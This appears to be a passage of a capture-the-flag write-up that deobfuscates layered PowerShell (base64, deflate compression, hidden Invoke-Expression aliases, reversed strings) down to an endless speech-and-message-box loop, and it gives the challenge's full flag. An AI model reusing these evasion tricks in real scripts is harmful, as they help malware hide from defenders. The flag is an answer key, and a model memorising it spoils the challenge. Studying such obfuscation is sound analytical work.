<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"JiAoICRWZXJib3NlcHJlRmVyZW5DZS50T3NUcmluRygpWzEsM10rJ1gnLWpPSW4nJykgKG5lVy1vYmpFQ3QgaW8uU3RSRUFtckVhRGVyKChuZVctb2JqRUN0IFN5c3RlTS5JTy5jT01QUmVTU2lPbi5kZWZsYVRlc3RSZWFtKCBbU3lzdEVtLmlPLm1FbW9yWVN0ckVhTV0gW0NPblZFUlRdOjpGUm9NQmFzZTY0c1RyaU5HKCdqVkpkYzZwSUV" "QMHJVN2RTdDZGR0NhQVJjV3NmVUNjcUlCcG0vSWdVRDRoRWlTSUd2TWFQOHI5dnRadmE1MzJabXVtZTdqNTl6bm1LaC9hMXAvNU5mc215V1F1TGFOTUpLblZkKzdrMWZrS3ZWUm5rTzFEUWdjSnRmdGR2Tkt4cFFUZDFkMnpETWFGaWdvYVBtSnRzK1AwUklFQkJJci9KWGJ2SlVuY1BGQktna0l0dWxQaUtMS2VEVGhtMVd1RjZQK2lPZ0VLOH" "g3UWlnTUtjQVFXaEFJVXNFUndvdkpjQmRxdkljc2t4NTQrenZNTzZyVmJJVmpsUUdIcDV5a3Vnd1B3eFBrY2RiTFhQMDdKTWlnTkdnTUlvVmtZRG9CQlVaSExYYjFhOWRnVUtUYWVuK2FiNmFUU0F3cXo0OGhQMUdqbUY1dUowdzNYOGw3bUduYU0wejl0QW9kdkh3NkMybXI0Y2JjTndjWDdEOHZ5bFMwZXpEUUlmVS95VDF1cXZPSGxkQndvc" "lpHbUNIS3k4YXpxZkcwMnMrc0JsdS9oM1htenE5U2xRTURIeHZOU2ZPMmRzcFdIUzIyd3o3TGhpQzlYRkhxTllqeEVTVU1CMU5XZDRjTTZOcG04UHJmNEVLTlN0MSsvdktSS1ZacHl6eG9hL21FRGhFUDhnMllrYTQ0THQ5S2gvV3VCVTFZNE80NlAvZmVGbmo3OEJoVVhNa01JSUpiRk1JMGFRNXNSQktZRENZTzFoMHNWdGw5dkU2R1ZmZ3dH" "aWNSeUIyMnJUMkRPdXpTTlNPUFJPYUowWXVaaTZzelI2NXMvYXRyMndlOGI1N2Rod3NPZkx2OHBOek5tMjhON2FMRGVhdlh6eGRxVUxKQ2lySVNYRzFmb2NxdjFHKzh2UlRZb1FiVytxbStwVzg1WUw4UWVKU3Q0WERtYm1BaWRQSnM0eXNvSENlamJHdDdwRitiNmpUbTk3QVFyME5FZFRNTXR1Um1Qei9lT3UzeVQ4dkUvUlg2TEVQUnFNNDF" "idExQZGZXNjFRRk1uSkczVUNFZzZ0aHdzRnYvZ294NUJseWloVmhzaVdRTE5jOEFpSWxGbk1QNktCRTJIdFBsZ1hMWTNVb1RFWmxoNFFReDRyK1VCNW9CSGxwU1FpWnA5THRGVjFocVdvT0pFa0g3dXZMT1puRnQ1OHdSOHoyYkY4NTBTZ3RQOVZKWHNpRVpBa0loRVpZSi9tZGhYbVFNTmFSUXRrRnUrVEl2bElpa1BDUjIwL21UNkZheTh0am" "1VZ0VVa2h2OGhmNURlUnlGTzVTWGE3d1NyUVF2ckVIL2R1b05WQ0NtZVFwWUNMSXZYV1lhdjFtUTg4Q1lCVWlFUklqeDJySjh0UG83YkxDSkdna3dHRlR4UnJyWUlzSzZmSW5iQ0FWSW1tS0tRcS9kOEt4VTMydldOZkRva3NrMzhBJyksW1NZU1RFbS5JTy5jT21wUkVzU0lvbi5Db01wUmVTU2lvbm1vREVdOjpkRUNvbVByZVNTKSkgLCBbd" "EV4VC5lbmNPZGluZ106OmFzY0lpKSApLnJFQURUb2VORCggKSAK"
</code></pre></div></div>
<p>Base64 decode that:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nv">$VerbosepreFerenCe</span><span class="o">.</span><span class="nf">tOsTrinG</span><span class="p">()[</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">'X'</span><span class="o">-jOIn</span><span class="s1">''</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">neW-objECt</span><span class="w"> </span><span class="nx">io.StREAmrEaDer</span><span class="p">((</span><span class="n">neW-objECt</span><span class="w"> </span><span class="nx">SysteM.IO.cOMPReSSiOn.deflaTestReam</span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">SystEm.iO.mEmorYStrEaM</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="n">COnVERT</span><span class="p">]::</span><span class="n">FRoMBase64sTriNG</span><span class="p">(</span><span class="s1">'jVJdc6pIEP0rU7dSt6FGCaARcWsfUCcqIBpm/IgUD4hEiSIGvMaP8r9vtZva532Zmume7j59znmKh/a1p/5NfsmyWQuLaNMJKnVd+7k1fkKvVRnkO1DQgcJtftdvNKxpQTd1d2zDMaFigoaPmJts+P0RIEBBIr/JXbvJUncPFBKgkItulPiKLKeDThm1WuF6P+iOgEK8x7QigMKcAQWhAIUsERwovJcBdqvIcskx54+zvMO6rVbIVjlQGHp5ykugwPwxPkcdbLXP07JMigNGgMIoVkYDoBBUZHLXb1a9dgUKTaen+ab6aTSAwqz48hP1GjmF5uJ0w3X8l7mGnaM0z9tAodvHw6C2mr4cbcNwcX7D8vylS0ezDQIfU/yT1uqvOHldBworZGmCHKy8azqfG02s+sBlu/h3Xmzq9SlQMDHxvNSfO2dspWHS22wz7LhiC9XFHqNYjxESUMB1NWd4cM6Npm8Prf4EKNSt1+/vKRKVZpyzxoa/mEDhEP8g2Yka44Lt9Kh/WuBU1Y4O46P/feFnj78BhUXMkMIIJbFMI0aQ5sRBKYDCYO1h0sVtl9vE6GVfgwGicRyB22rT2DOuzSNSOPROaJ0YuZi6szR65s/atr2we8b57dhwsOfLv8pNzNm28N7aLDeavXzxdqULJCirISXG1focqv1G+8vRTYoQbW+qm+pW85YL8QeJSt4XDmbmAidPJs4ysoHCejbGt7pF+b6jTm97AQr0NEdTMMtuRmPz/eOu3yT8vE/RX6LEPRqM41btLPdfW61QFMnJG3UCEg6thwsFv/gox5BlyihVhsiWQLNc8AiIlFnMP6KBE2HtPlgXLY3UoTEZlh4QQx4r+UB5oBHlpSQiZp9LtFV1hqWoOJEkH7uvLOZnFt58wR8z2bF850SgtP9VJXsiEZAkIhEZYJ/mdhXmQMNaRQtkFu+TIvlIikPCR20/mT6Fay8tjmUgEUkhv8hf5DeRyFO5SXa7wSrQQvrEH/duoNVCCmeQpYCLIvXWYav1mQ88CYBUiERIjx2rJ8tPo7bLCJGgkwGFTxRrrYIsK6fInbCAVImmKKQq/d8KxU32vWNfDoksk38A'</span><span class="p">),[</span><span class="n">SYSTEm.IO.cOmpREsSIon.CoMpReSSionmoDE</span><span class="p">]::</span><span class="n">dEComPreSS</span><span class="p">))</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">tExT.encOding</span><span class="p">]::</span><span class="nx">ascIi</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nf">rEADToeND</span><span class="p">(</span><span class="w"> </span><span class="p">)</span><span class="w"> 
</span></code></pre></div></div>

<p>Removing <code class="language-plaintext highlighter-rouge">&amp; ( $VerbosepreFerenCe.tOsTrinG()[1,3]+'X'-jOIn'')</code> and adding <code class="language-plaintext highlighter-rouge">Write-Output</code>, we run that:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cMJzG0</span><span class="o">=</span><span class="w"> </span><span class="s2">"))93]rahC[,421]rahC[,63]rahC[F-)')}'+'2'+'{X}2{+]31[DiLlEhS}'+'0'+'{+]1[DiLLehS}0'+'{ '+'( &amp; }1{)(Dn'+'e'+'oTDaeR.))iICsa::]gnIDO'+'cne'+'.T'+'XE'+'T.'+'meTS'+'Ys[ '+',))sSE'+'RPmoCED::]Edo'+'MNoiSs'+'ERP'+'MOC'+'.noisserp'+'M'+'Oc.OI'+'[,) }2{A43z'+'8KG1R90j76'+'WrqRe0zaKr1L'+'m7LKR5X1s'+'aiooB'+'DH'+'D7+J0i5tJ77Lo'+'6ANRbL+OWh'+'TP+H'+'i34F'+'Mg4'+'d'+'0Un'+'dNziXX78'+'6fT'+'D'+'iXrh44V'+'98'+'/b2/Cx'+'T1'+'iNhkmH'+'dEZ0Ln'+'Oc2c'+'a'+'P'+'1KMpKx68RJMAHU'+'4AFwwVE'+'imSSE6hS59'+'pc'+'d'+'lT3ESTEl2aHvZV'+'0JapPtRwySxNSQ'+'ZcEC'+'ae'+'A97cD'+'9UK'+'Y'+'IgN'+'aLh'+'bke7GmqIIa'+'KKT4'+'1VcN7z8t'+'mMNv'+'2cF'+'VLWia/S/1kBZJG7xQt6KK'+'5'+'ERPU9WkrNQBEo78GoZQz+ZT'+'m3'+'/7zAjM0H6BqK29+'+'ZJNV290k1NbZTu1'+'eYZK+'+'XTt'+'UUKbaJ'+'gWPt'+'0kB'+'waCGky'+'+vXM'+'EAJ8aP9Yf}2{('+'gni'+'RTs4'+'6ESa'+'BmoRF::]TrevNOC[ ]MAE'+'RTSyR'+'OMEm.Oi.Me'+'Ts'+'ys'+'[ (mAERtS'+'eTAlfED.'+'N'+'oissER'+'pM'+'oc.oI.M'+'ETsys TcEjbo'+'-W'+'en'+' ((Re'+'dAERmAe'+'RTS.Oi.MEtsYS Tc'+'Ejbo'+'-Wen ( '(( ( )''nioJ-'X'+]3,1[)EcnereferpeSOBReV</span><span class="err">$</span><span class="s2">]gNirts[( (. "</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nv">$shellId</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="nv">$ShellID</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span><span class="o">+</span><span class="s1">'x'</span><span class="p">)([</span><span class="n">STriNg</span><span class="p">]::</span><span class="n">joIN</span><span class="p">(</span><span class="s1">''</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="w">  </span><span class="n">GEt-vARiaBLE</span><span class="w">  </span><span class="p">(</span><span class="s1">'Cm'</span><span class="o">+</span><span class="s1">'j'</span><span class="o">+</span><span class="s1">'Zg0'</span><span class="p">))</span><span class="o">.</span><span class="n">vaLUE</span><span class="p">[</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="o">..</span><span class="w"> </span><span class="o">-</span><span class="p">((</span><span class="w">  </span><span class="n">GEt</span><span class="nt">-vARiaBLE</span><span class="w">  </span><span class="p">(</span><span class="s1">'Cm'</span><span class="o">+</span><span class="s1">'j'</span><span class="o">+</span><span class="s1">'Zg0'</span><span class="p">))</span><span class="o">.</span><span class="nf">vaLUE</span><span class="o">.</span><span class="nf">LenGtH</span><span class="p">)]</span><span class="w"> </span><span class="p">))</span><span class="w">
</span></code></pre></div></div>

<p>Running that we get:</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Speech</span><span class="p">;</span><span class="w"> </span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Windows.Forms</span><span class="w">
</span><span class="nv">$SpeechSynth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Speech.Synthesis.SpeechSynthesizer</span><span class="w">
</span><span class="nv">$SpeechSynth</span><span class="o">.</span><span class="nf">SelectVoice</span><span class="p">(</span><span class="s1">'Microsoft Zira Desktop'</span><span class="p">)</span><span class="w">
</span><span class="nv">$lizard</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Date</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="nx">tt</span><span class="w">
</span><span class="kr">while</span><span class="w"> </span><span class="p">(</span><span class="bp">$true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$SpeechSynth</span><span class="o">.</span><span class="nf">Speak</span><span class="p">(</span><span class="nv">$lizard</span><span class="p">)</span><span class="w">
    </span><span class="p">[</span><span class="n">System.Windows.Forms.MessageBox</span><span class="p">]::</span><span class="n">Show</span><span class="p">(</span><span class="nv">$lizard</span><span class="p">,</span><span class="w"> </span><span class="s1">'Alert'</span><span class="p">,</span><span class="w"> </span><span class="s1">'OK'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Information'</span><span class="p">)</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="nv">$UniqueRebel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"TWpVeU9UWXlORGN3ZlE9PQ=="</span><span class="w">
</span></code></pre></div></div>

<p>We finally get the last piece of our flag, which is again double Base64 encoded. We decode that to get <code class="language-plaintext highlighter-rouge">252962470}</code></p>

<p>As a reminder,  our flag is <code class="language-plaintext highlighter-rouge">objecttest + consumerfashion + uniquerebel</code>.
<code class="language-plaintext highlighter-rouge">objecttest</code> is <code class="language-plaintext highlighter-rouge">flag{7634269aea89</code>
<code class="language-plaintext highlighter-rouge">consumerfashion</code> is <code class="language-plaintext highlighter-rouge">c0434d59028</code>
<code class="language-plaintext highlighter-rouge">uniquerebel</code> is <code class="language-plaintext highlighter-rouge">252962470}</code></p>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">flag{7634269aea89c0434d59028252962470}</code></p>

<p align="right">(<a href="#top">back to top</a>)</p>
